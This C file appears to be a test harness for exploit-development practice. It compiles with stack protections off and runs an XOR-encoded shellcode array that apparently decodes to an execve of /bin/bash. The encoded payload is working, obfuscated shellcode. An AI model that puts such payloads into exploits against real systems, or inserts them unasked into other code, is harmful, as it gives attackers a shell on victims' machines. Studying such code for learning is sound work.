//gcc -fno-stack-protector -z execstack TestShellcode.c -o TestShell
//gcc -fno-stack-protector -z execstack TestShellcode.c -o TestShellCode -m32
//
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x41\xb0\xf4\x9b\x71\x22\xf4\xa3\x23\xdc\xa0\x23\xf4\xa4\x27\xb4\x27\xe4\xa0\x27\xfc\xa4\x9b\x6a\x1a\xa1\x67\x2a\x42\x4b\x55\x55\x55\x85\xc8\xc3\xc4\x85\xc8\xcb\xd9\xc2\xeb\xe8\xe8\xe8\xe8\xe9\xe9\xe9\xe9";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();
}
